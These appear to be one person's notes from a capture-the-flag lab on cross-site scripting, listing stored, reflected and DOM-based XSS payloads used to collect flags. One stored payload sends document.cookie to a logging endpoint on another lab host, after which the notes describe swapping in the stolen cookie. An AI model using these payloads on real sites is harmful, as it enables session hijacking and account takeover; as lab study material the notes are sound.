# Cross-site Scripting (XSS)
# Data: 30.09.2020, 01.10.2020

IP:`10.10.40.163`, `10.10.178.200`, `10.10.82.40`
------------------

register on www

1. Stroed XXS
	- <b> bold </b> - instert HTML to get 1st flag
	- <script>alert(document.cookie)</script> - display cookie, flag in pop-up
	- <script>document.getElementById('thm-title').innerHTML="I am a hacker"</script> - for a 3rd, hidden, flag

>i f.up lil bit - new machine, new IP:`10.10.178.200`


	- <script>document.location='http://10.10.178.200/log/'+document.cookie</script> 
		navigate to <IP>/logs/ and there is a cookie!
	- post new comment after changing cookie value (in burp or in DevTools)

2. Reflected XSS

	- <script>alert("Hello")</script>
	- <script>alert(window.location.hostname)</script>

3. DOM-Based XSS

	- test" onmouseover="alert(document.cookie)"
	- test" onmouseover="document.body.style.backgroundColor = 'red'




